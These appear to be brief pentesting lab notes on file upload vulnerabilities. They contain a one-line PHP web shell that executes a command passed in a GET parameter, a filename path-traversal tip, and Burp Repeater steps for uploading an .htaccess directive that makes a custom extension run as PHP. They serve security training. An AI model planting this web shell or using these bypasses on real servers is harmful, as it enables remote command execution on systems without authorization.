# File Upload

```
<?php echo system($_GET['command']); ?>
```

#### Preventing file execution in user-accessible directories <a href="#flawed-file-type-validation" id="flawed-file-type-validation"></a>

Change the name of the uploaded file with ../name to execute it in another directory

**Overriding the server configuration**

In Burp Repeater, go to the tab for the `POST /my-account/avatar` request and find the part of the body that relates to your PHP file. Make the following changes:

* Change the value of the `filename` parameter to `.htaccess`.
* Change the value of the `Content-Type` header to `text/plain`.
*   Replace the contents of the file (your PHP payload) with the following Apache directive:

    `AddType application/x-httpd-php .l33t`

    This maps an arbitrary extension (`.l33t`) to the executable MIME type `application/x-httpd-php`. As the server uses the `mod_php` module, it knows how to handle this already.
